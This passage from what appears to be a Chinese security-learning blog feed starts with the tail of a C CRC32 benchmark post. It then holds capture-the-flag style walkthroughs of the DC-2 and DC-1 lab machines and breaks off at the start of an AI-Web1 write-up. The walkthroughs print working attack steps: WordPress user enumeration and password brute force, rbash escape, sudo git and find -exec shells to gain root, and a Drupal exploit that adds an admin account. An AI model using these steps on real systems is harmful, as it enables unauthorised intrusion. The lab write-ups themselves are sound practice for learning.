&#123;&quot;Hello, CRC32!&quot;,&quot;Satisfaction&quot;,&quot;Technology&quot;,&quot;Wonderful&quot;,&quot;Efficiency&quot;,&quot;Innovation&quot;,&quot;Destination&quot;,&quot;Championship&quot;,//&quot;Celebration&quot;,&quot;Experience&quot;,&quot;Adventure&quot;,&quot;Inspiration&quot;,&quot;Leadership&quot;,&quot;Motivation&quot;,&quot;Creativity&quot;,&quot;Opportunity&quot;,//&quot;Progressive&quot;,&quot;Collaboration&quot;,&quot;Entrepreneur&quot;,&quot;Revolution&quot;,&quot;Transformation&quot;&#125;;//int i = 0;//for (i = 0; i &lt; 21; i++)&#123;//int len = strlen(&amp;*(str+i));//crc32_table_res = crc32(&amp;*(str+i), len);//printf(&quot;Hello, CRC32!：%X\n&quot;, crc32_table_res);//&#125;//return 0;//&#125;int main() &#123;        clock_t begin, end;    double cost;    begin = clock();    //char* str = &quot;Hello, CRC32!&quot;;    char* str = &quot;Life is too short to spend time with people who suck the happiness out of you. If someone wants you in their life, they’ll make room for you. You shouldn’t have to fight for a spot. Never, ever insist yourself to someone who continuously overlooks your worth. And remember, it’s not the people that stand by your side when you’re at your best, but the ones who stand beside you when you’re at your worst that are your true friends.&quot;;    int len = strlen(str);    uint32_t crc = crc32(str, len);    int i = 0;    for (i = 0; i &lt; 1000000; i++)        crc = crc32(str, len);    end = clock();    printf(&quot;Hello, CRC32!：%X\n&quot;, crc);    cost = (double)(end - begin)/CLOCKS_PER_SEC;    printf(&quot;constant CLOCKS_PER_SEC is: %ld\n, time cost is: %lf secs\n&quot;, CLOCKS_PER_SEC, cost);    return 0;&#125;</code></pre><h2 id="查表法"><a href="#查表法" class="headerlink" title="查表法"></a>查表法</h2><pre><code class="c">#include&lt;stdio.h&gt;#include&lt;stdint.h&gt;#include&lt;string.h&gt;#include&lt;time.h&gt;static uint32_t poly = 0x04C11DB7;  //多项式函数 static uint32_t crc32_table[256] = &#123;0x00000000, 0x04c11db7, 0x09823b6e, 0x0d4326d9, 0x130476dc, 0x17c56b6b, 0x1a864db2, 0x1e475005,0x2608edb8, 0x22c9f00f, 0x2f8ad6d6, 0x2b4bcb61, 0x350c9b64, 0x31cd86d3, 0x3c8ea00a, 0x384fbdbd,0x4c11db70, 0x48d0c6c7, 0x4593e01e, 0x4152fda9, 0x5f15adac, 0x5bd4b01b, 0x569796c2, 0x52568b75,0x6a1936c8, 0x6ed82b7f, 0x639b0da6, 0x675a1011, 0x791d4014, 0x7ddc5da3, 0x709f7b7a, 0x745e66cd,0x9823b6e0, 0x9ce2ab57, 0x91a18d8e, 0x95609039, 0x8b27c03c, 0x8fe6dd8b, 0x82a5fb52, 0x8664e6e5,0xbe2b5b58, 0xbaea46ef, 0xb7a96036, 0xb3687d81, 0xad2f2d84, 0xa9ee3033, 0xa4ad16ea, 0xa06c0b5d,0xd4326d90, 0xd0f37027, 0xddb056fe, 0xd9714b49, 0xc7361b4c, 0xc3f706fb, 0xceb42022, 0xca753d95,0xf23a8028, 0xf6fb9d9f, 0xfbb8bb46, 0xff79a6f1, 0xe13ef6f4, 0xe5ffeb43, 0xe8bccd9a, 0xec7dd02d,0x34867077, 0x30476dc0, 0x3d044b19, 0x39c556ae, 0x278206ab, 0x23431b1c, 0x2e003dc5, 0x2ac12072,0x128e9dcf, 0x164f8078, 0x1b0ca6a1, 0x1fcdbb16, 0x018aeb13, 0x054bf6a4, 0x0808d07d, 0x0cc9cdca,0x7897ab07, 0x7c56b6b0, 0x71159069, 0x75d48dde, 0x6b93dddb, 0x6f52c06c, 0x6211e6b5, 0x66d0fb02,0x5e9f46bf, 0x5a5e5b08, 0x571d7dd1, 0x53dc6066, 0x4d9b3063, 0x495a2dd4, 0x44190b0d, 0x40d816ba,0xaca5c697, 0xa864db20, 0xa527fdf9, 0xa1e6e04e, 0xbfa1b04b, 0xbb60adfc, 0xb6238b25, 0xb2e29692,0x8aad2b2f, 0x8e6c3698, 0x832f1041, 0x87ee0df6, 0x99a95df3, 0x9d684044, 0x902b669d, 0x94ea7b2a,0xe0b41de7, 0xe4750050, 0xe9362689, 0xedf73b3e, 0xf3b06b3b, 0xf771768c, 0xfa325055, 0xfef34de2,0xc6bcf05f, 0xc27dede8, 0xcf3ecb31, 0xcbffd686, 0xd5b88683, 0xd1799b34, 0xdc3abded, 0xd8fba05a,0x690ce0ee, 0x6dcdfd59, 0x608edb80, 0x644fc637, 0x7a089632, 0x7ec98b85, 0x738aad5c, 0x774bb0eb,0x4f040d56, 0x4bc510e1, 0x46863638, 0x42472b8f, 0x5c007b8a, 0x58c1663d, 0x558240e4, 0x51435d53,0x251d3b9e, 0x21dc2629, 0x2c9f00f0, 0x285e1d47, 0x36194d42, 0x32d850f5, 0x3f9b762c, 0x3b5a6b9b,0x0315d626, 0x07d4cb91, 0x0a97ed48, 0x0e56f0ff, 0x1011a0fa, 0x14d0bd4d, 0x19939b94, 0x1d528623,0xf12f560e, 0xf5ee4bb9, 0xf8ad6d60, 0xfc6c70d7, 0xe22b20d2, 0xe6ea3d65, 0xeba91bbc, 0xef68060b,0xd727bbb6, 0xd3e6a601, 0xdea580d8, 0xda649d6f, 0xc423cd6a, 0xc0e2d0dd, 0xcda1f604, 0xc960ebb3,0xbd3e8d7e, 0xb9ff90c9, 0xb4bcb610, 0xb07daba7, 0xae3afba2, 0xaafbe615, 0xa7b8c0cc, 0xa379dd7b,0x9b3660c6, 0x9ff77d71, 0x92b45ba8, 0x9675461f, 0x8832161a, 0x8cf30bad, 0x81b02d74, 0x857130c3,0x5d8a9099, 0x594b8d2e, 0x5408abf7, 0x50c9b640, 0x4e8ee645, 0x4a4ffbf2, 0x470cdd2b, 0x43cdc09c,0x7b827d21, 0x7f436096, 0x7200464f, 0x76c15bf8, 0x68860bfd, 0x6c47164a, 0x61043093, 0x65c52d24,0x119b4be9, 0x155a565e, 0x18197087, 0x1cd86d30, 0x029f3d35, 0x065e2082, 0x0b1d065b, 0x0fdc1bec,0x3793a651, 0x3352bbe6, 0x3e119d3f, 0x3ad08088, 0x2497d08d, 0x2056cd3a, 0x2d15ebe3, 0x29d4f654,0xc5a92679, 0xc1683bce, 0xcc2b1d17, 0xc8ea00a0, 0xd6ad50a5, 0xd26c4d12, 0xdf2f6bcb, 0xdbee767c,0xe3a1cbc1, 0xe760d676, 0xea23f0af, 0xeee2ed18, 0xf0a5bd1d, 0xf464a0aa, 0xf9278673, 0xfde69bc4,0x89b8fd09, 0x8d79e0be, 0x803ac667, 0x84fbdbd0, 0x9abc8bd5, 0x9e7d9662, 0x933eb0bb, 0x97ffad0c,0xafb010b1, 0xab710d06, 0xa6322bdf, 0xa2f33668, 0xbcb4666d, 0xb8757bda, 0xb5365d03, 0xb1f740b4&#125;;/* //生成CRC_32_Table void generate_crc32_table() &#123;    uint32_t tmp = 0;    uint32_t i, j;//uint32_t data = 0xffffffff; //初始化寄存器        for (i = 0; i &lt; 256; i++) &#123;        tmp = i &lt;&lt; 24;        for (j = 0; j &lt; 8; j++) &#123;            if (tmp &amp; 0x80000000)                 tmp = (tmp &lt;&lt; 1) ^ poly;            else                 tmp &lt;&lt;= 1;        &#125;        crc32_table[i] = tmp;    &#125;    for (i = 0; i &lt; 256; i++) &#123;        printf(&quot;0x%X, &quot;,crc32_table[i]);        if ((i + 1) % 8 == 0) &#123;            printf(&quot;\n&quot;);        &#125;    &#125;&#125;*/ uint32_t crc32(const char* str, int len) &#123;    uint32_t data = 0xffffffff; //初始化寄存器     int i = 0;    for (i = 0; i &lt; len; i++) &#123;        data = ((data &amp; 0x00ffffff) &lt;&lt; 8)  ^ crc32_table[(data &gt;&gt; 24) ^ (str[i]) &amp; 0xff];        //前面是保留处理后的字节         //后面由高位向低位处理，然后下标需要右移24位来处理     &#125;    return data ^ 0xffffffff;&#125;int main() &#123;    //生成CRC32表     //generate_crc32_table();    clock_t begin, end;    double cost;    begin = clock();    uint32_t crc32_table_res = 0;    char* str = &quot;Life is too short to spend time with people who suck the happiness out of you. If someone wants you in their life, they’ll make room for you. You shouldn’t have to fight for a spot. Never, ever insist yourself to someone who continuously overlooks your worth. And remember, it’s not the people that stand by your side when you’re at your best, but the ones who stand beside you when you’re at your worst that are your true friends.&quot;;    int len = strlen(str);    int i = 0;    for (i = 0; i &lt; 1000000; i++)&#123;        crc32_table_res = crc32(str, len);        &#125;    end = clock();    printf(&quot;Hello, CRC32!：%X\n&quot;, crc32_table_res);    cost = (double)(end - begin)/CLOCKS_PER_SEC;    printf(&quot;constant CLOCKS_PER_SEC is: %ld\n, time cost is: %lf secs\n&quot;, CLOCKS_PER_SEC, cost);        return 0;&#125;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-2</title>
      <link href="/2024/03/20/DC-2/"/>
      <url>/2024/03/20/DC-2/</url>
      
        <content type="html"><![CDATA[<h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1><p><strong>网段：192.168.174.0&#x2F;24</strong></p><p><strong>本靶场环境总共有5个flag</strong></p><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><h3 id="1-1-主机发现"><a href="#1-1-主机发现" class="headerlink" title="1.1. 主机发现"></a>1.1. 主机发现</h3><pre><code class="cnosole">nmap -sn 192.168.174.0/24或者netdiscover -r 192.168.174.0/24  --排除1，2，254</code></pre><p><img src="/../image/image-20240314135521954.png" alt="image-20240314135521954"></p><p>得到目标IP：<strong>192.168.174.146</strong></p><p>kali的IP：<strong>192.168.174.137</strong></p><h3 id="1-2-扫描端口和服务"><a href="#1-2-扫描端口和服务" class="headerlink" title="1.2. 扫描端口和服务"></a>1.2. 扫描端口和服务</h3><pre><code>sudo nmap -T4 -sV -O -A -p- 192.168.174.146</code></pre><pre><code>PORT     STATE SERVICE VERSION80/tcp   open  http    Apache httpd 2.4.10 ((Debian))|_http-server-header: Apache/2.4.10 (Debian)|_http-title: Did not follow redirect to http://dc-2/7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)| ssh-hostkey: |   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)MAC Address: 00:0C:29:0E:ED:A2 (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                 </code></pre><ul><li>80端口</li><li>7744，开放了openSSH</li></ul><h3 id="1-3-访问目标页面"><a href="#1-3-访问目标页面" class="headerlink" title="1.3. 访问目标页面"></a>1.3. 访问目标页面</h3><p><img src="/../image/image-20240314135853539.png" alt="image-20240314135853539"></p><blockquote><p>发现访问不了，且发现我们输入的ip地址自动转化为了域名，我们想到dc-2这个域名解析失败，我们需要更改hosts文件，添加一个ip域名指向。</p><p>修改hosts文件，添加靶机IP到域名dc-2的指向</p><pre><code>vim /etc/hosts192.168.174.146 dc-2</code></pre><p>重新访问</p></blockquote><p><img src="/../image/image-20240314140312356.png" alt="image-20240314140312356"></p><p>可以发现是一个登陆界面。返回DC-2，可以找到flag1</p><p><img src="/../image/image-20240314140401597.png" alt="image-20240314140401597"></p><p>翻译</p><pre><code class="markdown">你通常的单词表可能不起作用，所以，也许你只需要保持清醒。密码越多越好，但有时你就是不可能一网打尽。以一个人的身份登录以查看下一个标志。如果找不到，请以另一个用户登录。</code></pre><h3 id="1-4-用户名枚举"><a href="#1-4-用户名枚举" class="headerlink" title="1.4. 用户名枚举"></a>1.4. 用户名枚举</h3><p>前面我们提到这是一个wordpress的站，我们采用专门针对wordpress的工具wpscan来进行扫描<br>Wpscan一些常用语句：</p><pre><code>wpscan --url http://dc-2wpscan --url http://dc-2 --enumerate t 扫描主题wpscan --url http://dc-2 --enumerate p 扫描插件wpscan --url http://dc-2 --enumerate u 枚举用户</code></pre><p><img src="/../image/image-20240314141231744.png" alt="image-20240314141231744"></p><p>wp版本为4.7.10</p><p>登录页面尝试登录<br>随即输入用户名密码，提示用户名不存在，似乎可以进行用户名枚举</p><p><img src="/../image/image-20240314141933222.png" alt="image-20240314141933222"></p><pre><code>wpscan --url http://dc-2 --enumerate u 枚举用户</code></pre><p><img src="/../image/image-20240314142010991.png" alt="image-20240314142010991"></p><p>发现有3个用户admin、jerry、tom</p><h3 id="1-5-暴力破解出账号密码"><a href="#1-5-暴力破解出账号密码" class="headerlink" title="1.5. 暴力破解出账号密码"></a>1.5. 暴力破解出账号密码</h3><p>根据flag1可以用暴力破解，我们使用cewl生成字典，使用wpscan进行暴力破解。</p><p>cewl是一个ruby应用，爬行指定url的指定深度。也可以跟一个外部链接，结果会返回一个单词列表，这个列表可以扔到John the ripper工具里进行密码破解。</p><pre><code>cewl http://dc-2 &gt;&gt; 1.txt</code></pre><pre><code>wpscan --url http://dc-2 --passwords 1.txt</code></pre><p>破出来两个账号</p><p><img src="/../image/image-20240314142434933.png" alt="image-20240314142434933"></p><p>拿jerry登陆试试</p><p><img src="/../image/image-20240314142520431.png" alt="image-20240314142520431"></p><h3 id="1-6-flag2"><a href="#1-6-flag2" class="headerlink" title="1.6. flag2"></a>1.6. flag2</h3><p><img src="/../image/image-20240314142604407.png" alt="image-20240314142604407"></p><p>找其它进入点？</p><h3 id="1-7-在tom的家目录发现flag3"><a href="#1-7-在tom的家目录发现flag3" class="headerlink" title="1.7. 在tom的家目录发现flag3"></a>1.7. 在tom的家目录发现flag3</h3><p>登录ssh</p><pre><code>ssh tom@192.168.174.146 -p 7744 </code></pre><p><img src="/../image/image-20240314143018899.png" alt="image-20240314143018899"></p><p>在tom账号的家目录 发现flag3<br>cat用不了，我这里采用了vi来查看，当前&#x3D;也可以反弹一个shell到kali</p><p>poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</p><p>可怜的老汤姆总是追着杰瑞跑。也许他应该为自己造成的压力而死。</p><p>接下来，尝试<a href="https://blog.csdn.net/weixin_43705814/article/details/111879362">rbash绕过</a></p><pre><code>BASH_CMDS[a]=/bin/sh;a  注：把/bin/bash给a变量`export PATH=$PATH:/bin/    注：将/bin 作为PATH环境变量导出export PATH=$PATH:/usr/bin   注：将/usr/bin作为PATH环境变量导出echo /*</code></pre><p><img src="/../image/image-20240314143828274.png" alt="image-20240314143828274"></p><h3 id="1-8-jeryy-flag4"><a href="#1-8-jeryy-flag4" class="headerlink" title="1.8. jeryy flag4"></a>1.8. jeryy flag4</h3><p><img src="/../image/image-20240314144630088.png" alt="image-20240314144630088"></p><pre><code>Good to see that you&#39;ve made it this far - but you &quot; re not home yet .很高兴看到你走了这么远，但你还没回家。You still need to get the final flag (the only flag that really counts!!! ).您仍然需要获得最后的标志(唯一真正重要的标志！)No hints here 一you&#39;re on your own now. :- )这里没有暗示，一，你现在只能靠自己了。*-)Go on继续git outta here!!!!</code></pre><p>大致意思就是还没有结束。猜想需要提权才能获取到最终的flag，并且flag4 提示我们可以使用git，我们可以通过git来提权</p><p>我们可以看到无需root权限，jerry 可以使用 git</p><pre><code>sudo -l jerry #登陆</code></pre><p><img src="/../image/image-20240314153951516.png" alt="image-20240314153951516"></p><h3 id="1-9-提权"><a href="#1-9-提权" class="headerlink" title="1.9.提权"></a>1.9.提权</h3><p>查看一下可以使用的root权限命令</p><p>查找系统所有文件中拥有suid特殊权限的文件<br>-perm匹配权限<br>4000 2000 1000分别表示SUID SGID SBIT<br>1.普通文件，文件的权限一般三位，777最高文件权限-perm -0777搜索的就是最高权限的文件rwxrwxrwx-perm +0777搜索的只要包含rwxrwxrwx任意一个的文件2.特殊文件，包含权限位置四位，7000为最高，即-s-s-t，同样的方法-perm -7000搜索的就是最高权限的文件-s-s-t-perm +7000搜索的只要包含-s-s-t任意一个的文件，-s–(4000)、–s-(2000)、—t(1000)等</p><pre><code class="bash">find / -user root -perm -4000 -print 2&gt;/dev/null</code></pre><p><img src="/../image/image-20240314154328064.png" alt="image-20240314154328064"></p><p>sudo可以使用，但是不能到root权限(可以尝试jerry的用户)<br>在使用su jerry (密码：adipiscing)</p><p><img src="/../image/image-20240314154511107.png" alt="image-20240314154511107"></p><p>jerry用户也不可以直接sudo su</p><p>补充：<a href="https://blog.csdn.net/mutou990/article/details/107724302">su知识</a></p><p><strong>[sudo su] 切换root身份，不携带当前用户环境变量。</strong><br><strong>[sudo su -]切换root身份，携带当前用户环境变量。</strong></p><p>发现可以使用git命令 (root权限)</p><pre><code>sudo git help status </code></pre><p>输入!&#x2F;bin&#x2F;sh，直接输入就行</p><p><img src="/../image/image-20240314160001335.png" alt="image-20240314160001335"></p><p><img src="/../image/image-20240314160021137.png" alt="image-20240314160021137"></p><p><img src="/../image/image-20240314160050788.png" alt="image-20240314160050788"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-1</title>
      <link href="/2024/03/20/DC-1/"/>
      <url>/2024/03/20/DC-1/</url>
      
        <content type="html"><![CDATA[<h1 id="DC-1"><a href="#DC-1" class="headerlink" title="DC-1"></a>DC-1</h1><p><strong>网段：192.168.174.0&#x2F;24</strong></p><p><strong>本靶场环境总共有5个flag</strong></p><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><h3 id="1-1-主机发现"><a href="#1-1-主机发现" class="headerlink" title="1.1. 主机发现"></a>1.1. 主机发现</h3><pre><code class="cnosole">nmap -sn 192.168.174.0/24或者netdiscover -r 192.168.174.0/24  --排除1，2，254</code></pre><p><img src="/../image/image-20240313195746995.png" alt="image-20240313195746995"></p><p>得到目标IP：<strong>192.168.174.145</strong></p><p>kali的IP：<strong>192.168.174.137</strong></p><h3 id="1-2-扫描端口和服务"><a href="#1-2-扫描端口和服务" class="headerlink" title="1.2. 扫描端口和服务"></a>1.2. 扫描端口和服务</h3><pre><code>sudo nmap -T4 -sV -O -A -p- 192.168.174.145</code></pre><pre><code>PORT      STATE SERVICE VERSION22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)| ssh-hostkey: |   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)80/tcp    open  http    Apache httpd 2.2.22 ((Debian))|_http-server-header: Apache/2.2.22 (Debian)|_http-generator: Drupal 7 (http://drupal.org)|_http-title: Welcome to Drupal Site | Drupal Site| http-robots.txt: 36 disallowed entries (15 shown)| /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt111/tcp   open  rpcbind 2-4 (RPC #100000)| rpcinfo: |   program version    port/proto  service|   100000  2,3,4        111/tcp   rpcbind|   100000  2,3,4        111/udp   rpcbind|   100000  3,4          111/tcp6  rpcbind|   100000  3,4          111/udp6  rpcbind|   100024  1          36735/udp   status|   100024  1          42162/tcp6  status|   100024  1          57533/tcp   status|_  100024  1          58225/udp6  status57533/tcp open  status  1 (RPC #100024)MAC Address: 00:0C:29:7E:64:DD (VMware)Device type: general purposeRunning: Linux 3.XOS CPE: cpe:/o:linux:linux_kernel:3OS details: Linux 3.2 - 3.16Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                     </code></pre><ul><li>22算口，开放了ssh服务，OpenSSH 6.0p1</li><li>80端口，存在web服务，Apache httpd 2.2.22，Drupal 7</li><li>111端口，开放了rpcbind服务</li></ul><p>补充知识：Drupal由php语言编写的cms，rpcbind是NFS中用来进行消息通知的服务</p><h3 id="1-3-访问目标页面"><a href="#1-3-访问目标页面" class="headerlink" title="1.3. 访问目标页面"></a>1.3. 访问目标页面</h3><p><img src="/../image/image-20240313200659949.png" alt="image-20240313200659949"></p><p>可以看到是一个登陆界面，可能存在sql注入漏洞或弱口令，</p><h3 id="1-4-利用MSF渗透"><a href="#1-4-利用MSF渗透" class="headerlink" title="1.4. 利用MSF渗透"></a>1.4. 利用MSF渗透</h3><pre><code>MSF简单指令msfconsole进入MSF控制台search 搜索相应模块use           对应模块show options  查看信息set RHOST  远程主机iprun           攻击</code></pre><h4 id="1-4-1-搜索Drupal-7的漏洞"><a href="#1-4-1-搜索Drupal-7的漏洞" class="headerlink" title="1.4.1. 搜索Drupal 7的漏洞"></a>1.4.1. 搜索Drupal 7的漏洞</h4><pre><code>searchsploit Drupa 7</code></pre><p><img src="/../image/image-20240313201413144.png" alt="image-20240313201413144"></p><p>可以发现能利用的漏洞非常多</p><h4 id="1-4-2-进入MSF控制台搜索drupal模块"><a href="#1-4-2-进入MSF控制台搜索drupal模块" class="headerlink" title="1.4.2. 进入MSF控制台搜索drupal模块"></a>1.4.2. 进入MSF控制台搜索drupal模块</h4><p><img src="/../image/image-20240313201539370.png" alt="image-20240313201539370"></p><h4 id="1-4-3-选择模块进行测试"><a href="#1-4-3-选择模块进行测试" class="headerlink" title="1.4.3. 选择模块进行测试"></a>1.4.3. 选择模块进行测试</h4><p>用2018的试试</p><pre><code>use exploit/unix/webapp/drupal_drupalgeddon2</code></pre><h4 id="1-4-4-设置靶机IP运行msf"><a href="#1-4-4-设置靶机IP运行msf" class="headerlink" title="1.4.4 设置靶机IP运行msf"></a>1.4.4 设置靶机IP运行msf</h4><pre><code>set rhosts 192.168.174.145run </code></pre><h4 id="1-4-5-进入shell"><a href="#1-4-5-进入shell" class="headerlink" title="1.4.5 进入shell"></a>1.4.5 进入shell</h4><p><img src="/../image/image-20240313201920626.png" alt="image-20240313201920626"></p><p>但不是root权限，不妨先find一下flag问价</p><pre><code>find / -iname &quot;*flag*&quot;</code></pre><p><img src="/../image/image-20240313202242817.png" alt="image-20240313202242817"></p><p>有点多，先把带txt的过滤出来</p><p><img src="/../image/image-20240313202404685.png" alt="image-20240313202404685"></p><p>先找一下这三个</p><p><img src="/../image/image-20240313202717938.png" alt="image-20240313202717938"></p><p>可以看到其中只有flag1.txt是我们能访问的</p><pre><code>cat /var/www/flag1.txtEvery good CMS needs a config file - and so do you.每个好的CMS都需要一个配置文件——你也一样。</code></pre><p>通过这个线索我们可以区找一下这个cms的配置文件，但这个界面确实不怎么好看，使用python反弹一个交互式shell TTY。</p><pre><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)</code></pre><p><img src="/../image/image-20240313203341574.png" alt="image-20240313203341574"></p><p>搜索发现drupal的配置文件是 &#x2F;sites&#x2F;default&#x2F;settings.php ，是数据库连接配置文件。</p><p>去看一下能不能看到这个文件的信息</p><p><img src="/../image/image-20240313203955072.png" alt="image-20240313203955072"></p><p>可以看到数据库的账号密码,英文意思如下</p><pre><code>爆破攻击和字典攻击不是获得访问权限的唯一方法(您将需要访问权限)。你能用这些证书做什么?</code></pre><h4 id="登陆数据库"><a href="#登陆数据库" class="headerlink" title="登陆数据库"></a>登陆数据库</h4><p><strong>Drupal框架默认的用户表就是users表</strong></p><pre><code class="mysql">mysql -u dbuser -pR0ck3tshow databses; --发现drup数据库show tables; --发现users表select * from users;</code></pre><p><img src="/../image/image-20240313204216786.png" alt="image-20240313204216786"></p><p>发现admin账号和经过加密的密码，drupal常用密码加密是MD5格式，但是7.0以后因为安全性问题将加密方式改成了hash加密（由于很多在线MD5爆破和MD5数据库，可以查到很多MD5码的原文，所以Drupal 7已不再采用Drupal 6和5简单的MD5加密，而是采用一种新型的Hash加密方法。新型加密方法是“加了盐（Salt）”的MD5码，简单理解就是并不会直接将password进行MD5加密，而会和用户名或其它随机字符串组合在一起后再MD5加密。）。</p><p>这里不是md5加密，应该是自定义的加密方式。flag2中给的提示暴力破解不是唯一的方法我们得想一下其他的办法。</p><h5 id="方法一重置密码"><a href="#方法一重置密码" class="headerlink" title="方法一重置密码"></a>方法一重置密码</h5><p><img src="/../image/image-20240313205708345.png" alt="image-20240313205708345"></p><p>不知道为什么我用这个会报错说文件包含</p><pre><code>www-data@DC-1:/var/www$ php ./scripts/password-hash.sh 123456php ./scripts/password-hash.sh 123456password: 123456                hash: $S$D4xwucG8/pjZ3bY0Kbes7oTkR8SS8JttMWCI.FpOhtNmSYDcCqxa</code></pre><p>原来要在根目录下使用</p><p>在指定目录下执行脚本是为了确保脚本能够正确加载所需的文件和依赖项。在Drupal中，脚本需要包含Drupal的核心文件和库才能生成正确的密码哈希。一般情况下，Drupal的根目录包含<code>index.php</code>文件和<code>sites</code>目录。</p><p>得到后，再把他写入数据库中</p><p>mysql -h是MySQL命令行客户端中的参数，用于指定要连接的MySQL服务器的主机名或IP地址。在命令行中，-h后面可以跟上要连接的MySQL服务器的主机名或IP地址。</p><pre><code>mysql -h localhost -u dbuser -pR0ck3t</code></pre><p>然后把密码写如user表</p><pre><code class="msyql">update users set pass=&quot;$S$D4xwucG8/pjZ3bY0Kbes7oTkR8SS8JttMWCI.FpOhtNmSYDcCqxa&quot; where name=&quot;admin&quot;;</code></pre><p><img src="/../image/image-20240313211312372.png" alt="image-20240313211312372"></p><p><img src="/../image/image-20240313211331364.png" alt="image-20240313211331364"></p><h5 id="方法二，利用漏洞添加admin用户"><a href="#方法二，利用漏洞添加admin用户" class="headerlink" title="方法二，利用漏洞添加admin用户"></a>方法二，利用漏洞添加admin用户</h5><p><img src="/../image/image-20240313213434032.png" alt="image-20240313213434032"></p><p>但有版本要求，所以我们需要先查看drupal的版本</p><pre><code>cat /var/www/includes/bootstrap.inc | grep VERSION</code></pre><p><img src="/../image/image-20240313214051628.png" alt="image-20240313214051628"></p><p>7.21是可以利用该漏洞的</p><pre><code>python2 /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.174.145 -u youzipii -p 123123需要注意用python3会报错，要用python2执行</code></pre><p><img src="/../image/image-20240313214725060.png"></p><p><img src="/../image/image-20240313214901260.png" alt="image-20240313214901260"></p><p>可以看到也登陆进来了</p><h4 id="1-4-6-flag3"><a href="#1-4-6-flag3" class="headerlink" title="1.4.6 flag3"></a>1.4.6 flag3</h4><p><img src="/../image/image-20240313215010627.png" alt="image-20240313215010627"></p><p>翻译一下：特殊的PERMS可以帮助找到密码-但您需要-exec该命令，以确定如何获取在shadow文件中的内容 </p><p>别人说很明显的提示：find+perms+exec 命令用来提权</p><h4 id="1-4-7-flag4"><a href="#1-4-7-flag4" class="headerlink" title="1.4.7 flag4"></a>1.4.7 flag4</h4><p>根据flag3的提示提权，我们尝试查看用户列表信息（包含用户权限信息），这些用户信息一般存储在&#x2F;etc&#x2F;passwd目录下。</p><p><img src="/../image/image-20240313215214862.png" alt="image-20240313215214862"></p><p><strong>注意，&#x2F;etc&#x2F;passwd包含系统所有账户信息，只有超级用户才有写和访问。该文件每个用户占一行用，分隔成七个字段。如下图所示：</strong></p><p><img src="https://img2020.cnblogs.com/blog/1962254/202007/1962254-20200713224545400-294633646.png" alt="img"></p><p>切换到home目录寻找flag4相关文件,并尝试查看。</p><p><img src="/../image/image-20240313215341017.png" alt="image-20240313215341017"></p><p><strong>提示最后flag in root下面。</strong></p><h4 id="1-4-8-提权-获得最终flag"><a href="#1-4-8-提权-获得最终flag" class="headerlink" title="1.4.8 提权+获得最终flag"></a><strong>1.4.8 提权+获得最终flag</strong></h4><p><img src="/../image/image-20240313215633609.png" alt="image-20240313215633609"></p><p>下面就是提权了</p><p>根据flag3中的提示，使用“-exec”提权,也就是find+perms+exec 命令来提权。这里有两种方法可以用，看个人想法。详细关于find提权会在另一篇文章中详解。</p><pre><code class="bash">1. find ./ acce -exec &#39;/bin/sh&#39; \;2. touch bcce有可能不能创建find bcce -exec &#39;/bin/sh&#39; \;</code></pre><p><img src="/../image/image-20240313215833812.png" alt="image-20240313215833812"></p><p>访问最后一个flag</p><p><img src="/../image/image-20240313215921134.png" alt="image-20240313215921134"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ai-web1通关记录</title>
      <link href="/2024/03/20/Ai-web1%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/03/20/Ai-web1%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="AI-Web1通关记录"><a href="#AI-Web1通关记录" class="headerlink" title="AI-Web1通关记录"></a>AI-Web1通关记录</h1><p><strong>学习自<a href="https://blog.csdn.net/qq_51577576?type=blog">_PowerShell</a></strong></p><p><strong>靶机地址：192.168.174.134</strong></p><p><strong>kali地址：192.168.174.137</strong></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><pre><code>└─$ nmap -sn 192.168.174.0/24 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 13:30 CSTNmap scan report for 192.168.174.2Host is up (0.00076s latency).Nmap scan report for 192.168.174.134Host is up (0.00059s latency).Nmap scan report for 192.168.174.137Host is up (0.00044s latency).Nmap done: 256 IP addresses (3 hosts up) scanned in 5.09 